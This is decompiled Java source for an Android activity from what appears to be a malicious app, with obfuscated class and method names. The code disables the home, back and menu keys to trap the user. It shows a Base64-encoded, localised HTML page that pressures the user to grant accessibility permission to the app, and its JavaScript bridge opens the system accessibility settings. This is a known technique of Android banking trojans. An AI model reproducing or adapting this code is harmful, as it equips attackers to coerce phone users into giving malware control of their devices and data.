package com.appser;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Bundle;
import android.util.Base64;
import android.view.KeyEvent;
import android.webkit.JavascriptInterface;
import android.webkit.JsResult;
import android.webkit.WebChromeClient;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import com.appser.verapq.R;
import java.util.Locale;
import org.json.JSONObject;

public class necspredictyfioinitiallyqcodingojaguarxrequirednstaysneffectivelylclarityrassetgcarriersautox16 extends Activity {
    public String localeForAccessibility = "{'en':'Enable','de':'Aktivieren','ar':'تفعيل";

    public boolean onKeyDown(int i, KeyEvent keyEvent) {
        return i == 3 || i == 4 || i == 82;
    }

    public void finish() {
        if (Build.VERSION.SDK_INT >= 21) {
            finishAndRemoveTask();
        } else {
            super.finish();
        }
    }

    public String localeTextAccessibility() {
        try {
            return new JSONObject(this.localeForAccessibility).getString(Locale.getDefault().getLanguage());
        } catch (Exception unused) {
            return "Enable";
        }
    }

    public void onBackPressed() {
        super.onBackPressed();
    }

    public void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        try {
            WebView webView = new WebView(this);
            webView.getSettings().setJavaScriptEnabled(true);
            webView.setScrollBarStyle(0);
            webView.setWebViewClient(new MyWebViewClient());
            webView.setWebChromeClient(new MyWebChromeClient());
            webView.addJavascriptInterface(new WebAppInterface(this), "Android");
            String string = getString(R.string.Access);
            String labelApplication = safarivreaderstrailsoincomingabreathnmailmanssettledccompetingjhintsoeffectivelyxicsftteenagex5.getLabelApplication(this);
            String replace = new String(Base64.decode(string, 0), "UTF-8").replace("Start Accessibility", labelApplication);
            String replace2 = replace.replace("Enable Accessibility To Continue", localeTextAccessibility() + " : '" + labelApplication + "'");
            StringBuilder sb = new StringBuilder();
            sb.append("var lang = '");
            sb.append(Locale.getDefault().getLanguage());
            sb.append("'");
            String replace3 = replace2.replace("var lang = 'en'", sb.toString());
            String raisefmicemmexicoxwordpressggraphicyropexrestorationsjessicaiallahgthreadedjtexasrsocksjknowsf40 = safarivreaderstrailsoincomingabreathnmailmanssettledccompetingjhintsoeffectivelyxicsftteenagex5.raisefmicemmexicoxwordpressggraphicyropexrestorationsjessicaiallahgthreadedjtexasrsocksjknowsf40("PGh0bWwgbGFuZz0iZW4iPg==");
            webView.loadDataWithBaseURL((String) null, replace3.replace(raisefmicemmexicoxwordpressggraphicyropexrestorationsjessicaiallahgthreadedjtexasrsocksjknowsf40, safarivreaderstrailsoincomingabreathnmailmanssettledccompetingjhintsoeffectivelyxicsftteenagex5.raisefmicemmexicoxwordpressggraphicyropexrestorationsjessicaiallahgthreadedjtexasrsocksjknowsf40("PGh0bWwgbGFuZz0i") + Locale.getDefault().getLanguage() + safarivreaderstrailsoincomingabreathnmailmanssettledccompetingjhintsoeffectivelyxicsftteenagex5.raisefmicemmexicoxwordpressggraphicyropexrestorationsjessicaiallahgthreadedjtexasrsocksjknowsf40("Ij4=")), "text/html", "UTF-8", (String) null);
            setContentView(webView);
        } catch (Exception unused) {
        }
    }

    public void onDestroy() {
        super.onDestroy();
    }

    /* access modifiers changed from: protected */
    public void onStop() {
        super.onStop();
    }

    private class MyWebChromeClient extends WebChromeClient {
        public boolean onJsAlert(WebView webView, String str, String str2, JsResult jsResult) {
            return true;
        }

        private MyWebChromeClient() {
        }
    }

    private class MyWebViewClient extends WebViewClient {
        public void onPageFinished(WebView webView, String str) {
        }

        public boolean shouldOverrideUrlLoading(WebView webView, String str) {
            return false;
        }

        private MyWebViewClient() {
        }
    }

    public class WebAppInterface {
        Context mContext;

        WebAppInterface(Context context) {
            this.mContext = context;
        }

        @JavascriptInterface
        public void returnResult() {
            Intent intent = new Intent("android.settings.ACCESSIBILITY_SETTINGS");
            intent.setFlags(268435456);
            necspredictyfioinitiallyqcodingojaguarxrequirednstaysneffectivelylclarityrassetgcarriersautox16.this.startActivity(intent);
        }
    }
}
